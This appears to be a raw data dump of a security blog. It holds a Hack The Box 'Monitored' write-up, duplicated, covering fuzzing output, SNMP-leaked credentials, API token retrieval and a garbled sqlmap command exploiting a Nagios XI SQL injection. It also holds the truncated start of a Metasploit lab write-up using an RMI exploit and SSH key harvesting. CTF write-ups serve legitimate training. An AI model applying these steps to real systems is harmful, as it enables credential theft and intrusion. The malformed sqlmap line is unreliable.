403, Size: 286, Words: 20, Lines: 10, Duration: 210ms]</span><br><span class=\"line\">config                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms]</span><br><span class=\"line\">views                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms]</span><br><span class=\"line\">sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms]</span><br><span class=\"line\">terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms]</span><br></pre></td></tr></table></figure>\n<p>Checking out <code>terminal</code> directory, there’s a shell in box gui which after trying out soem authentication bypasses it didn’t work.<br>Later on went on to fuzz the <code>api</code> endpoint. </p>\n<h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><p>Fuzzing the API endpoints gives us 2 endpoints the <code>v1</code> and <code>includes</code>. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.</p>\n<p><strong>Note</strong>:<br>If we visit &#x2F;api&#x2F;v1&#x2F;xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.&#96;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms]</span><br><span class=\"line\">%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms]</span><br><span class=\"line\">video games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms]</span><br><span class=\"line\">authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms]</span><br></pre></td></tr></table></figure>\n\n<p>We get an interesting endpoint called authenticate but trying to access it we find that, we can only use <code>POST</code> to authenticate and since we don’t have any credentials to authenticate with decided to go back to the nmap results and enumerate more.</p>\n<h2 id=\"UDP\"><a href=\"#UDP\" class=\"headerlink\" title=\"UDP\"></a>UDP</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT      STATE         SERVICE</span><br><span class=\"line\">7/udp     open|filtered <span class=\"built_in\">echo</span></span><br><span class=\"line\">53/udp    open|filtered domain</span><br><span class=\"line\">68/udp    open|filtered dhcpc</span><br><span class=\"line\">123/udp   open          ntp</span><br><span class=\"line\">161/udp   open          snmp</span><br><span class=\"line\">162/udp   open|filtered snmptrap</span><br><span class=\"line\">16838/udp open|filtered unknown</span><br><span class=\"line\">18617/udp open|filtered unknown</span><br><span class=\"line\">21131/udp open|filtered unknown</span><br><span class=\"line\">21698/udp open|filtered unknown</span><br><span class=\"line\">28547/udp open|filtered unknown</span><br><span class=\"line\">49181/udp open|filtered unknown</span><br></pre></td></tr></table></figure>\n\n<p>Enumerating UDP ports, we find that snmp is open, enumerating snmp using <a href=\"https://github.com/mteg/braa\">braa</a> a mass snmp scanner. We get interesting results.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.505 = STRING: <span class=\"string\">&quot;--config /etc/laurel/config.toml&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.549 = STRING: <span class=\"string\">&quot;-f&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.550 = STRING: <span class=\"string\">&quot;--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.553 = STRING: <span class=\"string\">&quot;-n -iNONE&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.556 = STRING: <span class=\"string\">&quot;-u -s -O /run/wpa_supplicant&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.568 = STRING: <span class=\"string\">&quot;-f&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: <span class=\"string\">&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.642 = STRING: <span class=\"string\">&quot;-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.762 = STRING: <span class=\"string\">&quot;-f /usr/local/nagios/etc/pnp/npcd.cfg&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.769 = STRING: <span class=\"string\">&quot;-LOw -f -p /run/snmptrapd.pid&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: <span class=\"string\">&quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: <span class=\"string\">&quot;-p /var/run/ntpd.pid -g -u 108:116&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.806 = STRING: <span class=\"string\">&quot;-o -p -- \\\\u --noclear tty1 linux&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.841 = STRING: <span class=\"string\">&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: <span class=\"string\">&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.848 = STRING: <span class=\"string\">&quot;-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: <span class=\"string\">&quot;-k start&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: <span class=\"string\">&quot;-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.942 = STRING: <span class=\"string\">&quot;/usr/sbin/snmptt --daemon&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.943 = STRING: <span class=\"string\">&quot;/usr/sbin/snmptt --daemon&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.972 = STRING: <span class=\"string\">&quot;-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: <span class=\"string\">&quot;-d /usr/local/nagios/etc/nagios.cfg&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: <span class=\"string\">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: <span class=\"string\">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: <span class=\"string\">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>we identify there’s a user called <code>svc</code> and also a passowrd that the user tried to authenticate with.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: <span class=\"string\">&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Initial-Foothold\"><a href=\"#Initial-Foothold\" class=\"headerlink\" title=\"Initial Foothold.\"></a>Initial Foothold.</h2><p>Now having creds to login and hving prior knowledge that we have a few instances on the <code>API</code> and <code>terminal</code> endpoints that we had to try out, started out with the terminal endpoint, didn’t give us any results, proceeded to the <code>API</code> endpoint where we are need to construct a post request so as to authenticate.</p>\n<p><img src=\"https://imgur.com/dEBYn5d.png\"></p>\n<p>An Auth Token Obtain after using curl.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -X POST -k -L -d <span class=\"string\">&#x27;username=svc&amp;password=XjH7VCehowpR1xZB&#x27;</span> https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/```</span><br><span class=\"line\"></span><br><span class=\"line\">```bash </span><br><span class=\"line\">&#123;<span class=\"string\">&quot;username&quot;</span>:<span class=\"string\">&quot;svc&quot;</span>,<span class=\"string\">&quot;user_id&quot;</span>:<span class=\"string\">&quot;2&quot;</span>,<span class=\"string\">&quot;auth_token&quot;</span>:<span class=\"string\">&quot;76064ac8a8a9ece7c349404e1f99a45665e9acfc&quot;</span>,<span class=\"string\">&quot;valid_min&quot;</span>:5,<span class=\"string\">&quot;valid_until&quot;</span>:<span class=\"string\">&quot;Fri, 23 Feb 2024 22:38:15 -0500&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>we get an auth token, going back to the <code>nagios</code> directory, we can authenticate and successfully login.</p>\n<p><img src=\"https://imgur.com/fHkual8.png\"></p>\n<p>According with this <a href=\"https://www.cve.org/CVERecord?id=CVE-2023-40931\">CVE</a> there is a Post-Auth SQLi, so let’s try POST &#x2F;nagiosxi&#x2F;admin&#x2F;banner_message-ajaxhelper.php HTTP&#x2F;1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -u <span class=\"string\">&quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&quot;</span> --level 5 --risk 3 -p <span class=\"built_in\">id</span> --batch -D nagiosxi --dump -T xi_users | awk -F<span class=\"string\">&#x27;&quot;&#x27;</span> <span class=\"string\">&#x27;&#123;print$12&#125;&#x27;</span><span class=\"string\">&quot; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n\n\n","cover":false,"excerpt":"","more":"<p><img src=\"https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ht14f3nLye487pVBC_xxFQ.png\"></p>\n<p>Today we’ll be covering an interesting box called <em>Monitored</em> introduced with a medium level difficulty so let’s check it out.</p>\n<h3 id=\"Nmap-Scans\"><a href=\"#Nmap-Scans\" class=\"headerlink\" title=\"Nmap Scans.\"></a>Nmap Scans.</h3><p>Starting off with some port enumeration we get some interesting ports open.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT     STATE  SERVICE          VERSION</span><br><span class=\"line\">22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class=\"line\">53/tcp   closed domain</span><br><span class=\"line\">80/tcp   open   http             Apache httpd 2.4.56</span><br><span class=\"line\">135/tcp  closed msrpc</span><br><span class=\"line\">389/tcp  open   ldap</span><br><span class=\"line\">139/tcp  closed netbios-ssn</span><br><span class=\"line\">445/tcp  closed microsoft-ds</span><br><span class=\"line\">464/tcp  closed kpasswd5</span><br><span class=\"line\">593/tcp  closed http-rpc-epmap</span><br><span class=\"line\">636/tcp  closed ldapssl</span><br><span class=\"line\">1433/tcp closed ms-sql-s</span><br><span class=\"line\">3268/tcp closed globalcatLDAP</span><br><span class=\"line\">3269/tcp closed globalcatLDAPssl</span><br><span class=\"line\">5667/tcp open   tcpwrapped</span><br><span class=\"line\">Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"Web-Enumeration-port-80\"><a href=\"#Web-Enumeration-port-80\" class=\"headerlink\" title=\"Web Enumeration (port 80)\"></a>Web Enumeration (port 80)</h2><p>Intially checking port 80 it redirects to <code>nagios.monitored.htb</code><br><img src=\"https://imgur.com/ELNHUOG.png\"> checking the site out. We are redirected to nagios XI.<br><img src=\"https://imgur.com/rcKawD1.png\"> which is a server and networking monitoring software.</p>\n<h2 id=\"Fuzzing-port-80\"><a href=\"#Fuzzing-port-80\" class=\"headerlink\" title=\"Fuzzing port 80.\"></a>Fuzzing port 80.</h2><p>Trying login with the default credentials found online didn’t provide us with access, hence the next step was to fuzz for some directory that might be hidden.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms]</span><br><span class=\"line\">                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms]</span><br><span class=\"line\">.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]</span><br><span class=\"line\">.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms]</span><br><span class=\"line\">.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms]</span><br><span class=\"line\">.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms]</span><br><span class=\"line\">.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms]</span><br><span class=\"line\">.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms]</span><br><span class=\"line\">cgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]</span><br><span class=\"line\">cgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]</span><br><span class=\"line\">index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms]</span><br><span class=\"line\">index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms]</span><br><span class=\"line\">javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]</span><br><span class=\"line\">nagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms]</span><br><span class=\"line\">server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms]</span><br></pre></td></tr></table></figure>\n<p>We see that the <code>nagios</code> directory seems interesting but navigating tot the directory doesn’t produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory <code>nagiosxi</code>.</p>\n<h2 id=\"nagiosxi\"><a href=\"#nagiosxi\" class=\"headerlink\" title=\"nagiosxi\"></a>nagiosxi</h2><p>Fuzzing the directory we get some interesting directories, </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]</span></span><br><span class=\"line\"><span class=\"built_in\">help</span>                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms]</span><br><span class=\"line\">tools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms]</span><br><span class=\"line\">mobile                  [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms]</span><br><span class=\"line\">admin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms]</span><br><span class=\"line\">reports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms]</span><br><span class=\"line\">account                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms]</span><br><span class=\"line\">includes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms]</span><br><span class=\"line\">backend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms]</span><br><span class=\"line\">db                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms]</span><br><span class=\"line\">api                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms]</span><br><span class=\"line\">config                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms]</span><br><span class=\"line\">views                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms]</span><br><span class=\"line\">sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms]</span><br><span class=\"line\">terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms]</span><br></pre></td></tr></table></figure>\n<p>Checking out <code>terminal</code> directory, there’s a shell in box gui which after trying out soem authentication bypasses it didn’t work.<br>Later on went on to fuzz the <code>api</code> endpoint. </p>\n<h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><p>Fuzzing the API endpoints gives us 2 endpoints the <code>v1</code> and <code>includes</code>. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.</p>\n<p><strong>Note</strong>:<br>If we visit &#x2F;api&#x2F;v1&#x2F;xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.&#96;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms]</span><br><span class=\"line\">%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms]</span><br><span class=\"line\">video games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms]</span><br><span class=\"line\">authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms]</span><br></pre></td></tr></table></figure>\n\n<p>We get an interesting endpoint called authenticate but trying to access it we find that, we can only use <code>POST</code> to authenticate and since we don’t have any credentials to authenticate with decided to go back to the nmap results and enumerate more.</p>\n<h2 id=\"UDP\"><a href=\"#UDP\" class=\"headerlink\" title=\"UDP\"></a>UDP</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT      STATE         SERVICE</span><br><span class=\"line\">7/udp     open|filtered <span class=\"built_in\">echo</span></span><br><span class=\"line\">53/udp    open|filtered domain</span><br><span class=\"line\">68/udp    open|filtered dhcpc</span><br><span class=\"line\">123/udp   open          ntp</span><br><span class=\"line\">161/udp   open          snmp</span><br><span class=\"line\">162/udp   open|filtered snmptrap</span><br><span class=\"line\">16838/udp open|filtered unknown</span><br><span class=\"line\">18617/udp open|filtered unknown</span><br><span class=\"line\">21131/udp open|filtered unknown</span><br><span class=\"line\">21698/udp open|filtered unknown</span><br><span class=\"line\">28547/udp open|filtered unknown</span><br><span class=\"line\">49181/udp open|filtered unknown</span><br></pre></td></tr></table></figure>\n\n<p>Enumerating UDP ports, we find that snmp is open, enumerating snmp using <a href=\"https://github.com/mteg/braa\">braa</a> a mass snmp scanner. We get interesting results.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.505 = STRING: <span class=\"string\">&quot;--config /etc/laurel/config.toml&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.549 = STRING: <span class=\"string\">&quot;-f&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.550 = STRING: <span class=\"string\">&quot;--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.553 = STRING: <span class=\"string\">&quot;-n -iNONE&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.556 = STRING: <span class=\"string\">&quot;-u -s -O /run/wpa_supplicant&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.568 = STRING: <span class=\"string\">&quot;-f&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: <span class=\"string\">&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.642 = STRING: <span class=\"string\">&quot;-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.762 = STRING: <span class=\"string\">&quot;-f /usr/local/nagios/etc/pnp/npcd.cfg&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.769 = STRING: <span class=\"string\">&quot;-LOw -f -p /run/snmptrapd.pid&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: <span class=\"string\">&quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: <span class=\"string\">&quot;-p /var/run/ntpd.pid -g -u 108:116&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.806 = STRING: <span class=\"string\">&quot;-o -p -- \\\\u --noclear tty1 linux&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.841 = STRING: <span class=\"string\">&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: <span class=\"string\">&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.848 = STRING: <span class=\"string\">&quot;-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: <span class=\"string\">&quot;-k start&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: <span class=\"string\">&quot;-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.942 = STRING: <span class=\"string\">&quot;/usr/sbin/snmptt --daemon&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.943 = STRING: <span class=\"string\">&quot;/usr/sbin/snmptt --daemon&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.972 = STRING: <span class=\"string\">&quot;-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: <span class=\"string\">&quot;-d /usr/local/nagios/etc/nagios.cfg&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: <span class=\"string\">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: <span class=\"string\">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: <span class=\"string\">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>we identify there’s a user called <code>svc</code> and also a passowrd that the user tried to authenticate with.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: <span class=\"string\">&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Initial-Foothold\"><a href=\"#Initial-Foothold\" class=\"headerlink\" title=\"Initial Foothold.\"></a>Initial Foothold.</h2><p>Now having creds to login and hving prior knowledge that we have a few instances on the <code>API</code> and <code>terminal</code> endpoints that we had to try out, started out with the terminal endpoint, didn’t give us any results, proceeded to the <code>API</code> endpoint where we are need to construct a post request so as to authenticate.</p>\n<p><img src=\"https://imgur.com/dEBYn5d.png\"></p>\n<p>An Auth Token Obtain after using curl.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -X POST -k -L -d <span class=\"string\">&#x27;username=svc&amp;password=XjH7VCehowpR1xZB&#x27;</span> https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/```</span><br><span class=\"line\"></span><br><span class=\"line\">```bash </span><br><span class=\"line\">&#123;<span class=\"string\">&quot;username&quot;</span>:<span class=\"string\">&quot;svc&quot;</span>,<span class=\"string\">&quot;user_id&quot;</span>:<span class=\"string\">&quot;2&quot;</span>,<span class=\"string\">&quot;auth_token&quot;</span>:<span class=\"string\">&quot;76064ac8a8a9ece7c349404e1f99a45665e9acfc&quot;</span>,<span class=\"string\">&quot;valid_min&quot;</span>:5,<span class=\"string\">&quot;valid_until&quot;</span>:<span class=\"string\">&quot;Fri, 23 Feb 2024 22:38:15 -0500&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>we get an auth token, going back to the <code>nagios</code> directory, we can authenticate and successfully login.</p>\n<p><img src=\"https://imgur.com/fHkual8.png\"></p>\n<p>According with this <a href=\"https://www.cve.org/CVERecord?id=CVE-2023-40931\">CVE</a> there is a Post-Auth SQLi, so let’s try POST &#x2F;nagiosxi&#x2F;admin&#x2F;banner_message-ajaxhelper.php HTTP&#x2F;1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -u <span class=\"string\">&quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&quot;</span> --level 5 --risk 3 -p <span class=\"built_in\">id</span> --batch -D nagiosxi --dump -T xi_users | awk -F<span class=\"string\">&#x27;&quot;&#x27;</span> <span class=\"string\">&#x27;&#123;print$12&#125;&#x27;</span><span class=\"string\">&quot; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n\n\n"},{"title":"MSF CTF","date":"2023-09-15T08:30:03.000Z","showToc":true,"top_img":"/images/cyberpunk-red.jpg","TocOpen":false,"draft":false,"hidemeta":false,"comments":0,"description":"Metasploit ctf series","hideSummary":false,"searchHidden":false,"ShowReadingTime":true,"ShowBreadCrumbs":true,"ShowPostNavLinks":true,"ShowWordCount":false,"ShowRssButtonInSectionTermList":true,"UseHugoToc":true,"_content":"# Metasploit ctf I (*easy*)\n\n### CTF Scenario:\n\n- This lab is dedicated to you! No other users are on this network :)\n- Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z.\n- The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0/24\n- The target systems most of times, belong to \"admin\" or \"root\" user.\n- Do not attack the gateway located at IP address 192.X.Y.1\n- You can use all tools installed in Kali to complete this lab.\n\n## Flags:\n\n- This lab has only 1 Flag to be collected.\n- The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX.\n- The Flag can either be a normal string or a 32-character random Hex string.\n## Recon \nchecking our network interfaces, with `ip a s` this is a command used to display info about the network interfaces on the system.\n\n![](https://i.imgur.com/Q3nW1a4.png)\n\nHaving identified our target `target-1`, & `target-2` , our aim is to exploit the two boxes, so running an nmap scan we see `target-1` is running `rmiregistry` on port 1909 and `target-2` is running ssh.\n\n![](https://i.imgur.com/Vzu6BCd.png)\n\nWhat is ***rmiregistry***? it's a tool in Java used for Remote Method Invocation to manage and look up remote objects on a network,*RMI* in java allows objects in one Java Virtual Machine to invoke methods on objects residing in another JVM, another remote machine. \nThis provides a way for Java applications to communicate and interact across a network.[https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html](read more)\n\n## metasploit \nsince it's a metasploit ctf we need to check out for some exploit. \n\nWe find a module that take advantage of the deault configuration of the RMI registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. \n\nAs it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. \n\nRMI method calls do not support or  require any sort of authentication.\n\n## exploit \nSo, loading up everything on metasploit, running the module we get a shell back\n\n![](https://i.imgur.com/Le8fCAn.png)\n\nstabilizing our shell we go to the home directory under the folder alice there is some ssh keys that we can use and login with since we are already root.\n\n![](https://i.imgur.com/LUcKnZZ.png)\n\nso, having known where the ssh keys are we can background our sessions and use the ssh_creds metasploit module.\n\n## flag.\nthe ssh_creds metasploit module, it will collect the contents of all users' .ssh directories on the targeted machine.\n\n![](https://i.imgur.com/Feds9zY.png)\n\nAfter which we can use the ssh_login module to login into the machine *target-2*, we are using the login_pubkey cause of the public key we got on the alice folder.\n\n![](https://i.imgur.com/8bo6jEO.png)\n\n**N|B** \n\nI set the rhost to the machine that we are targeting *target-2* which is the ip with the *.4*.\n\nChecking our sessions we see that we have a new session created and we got the 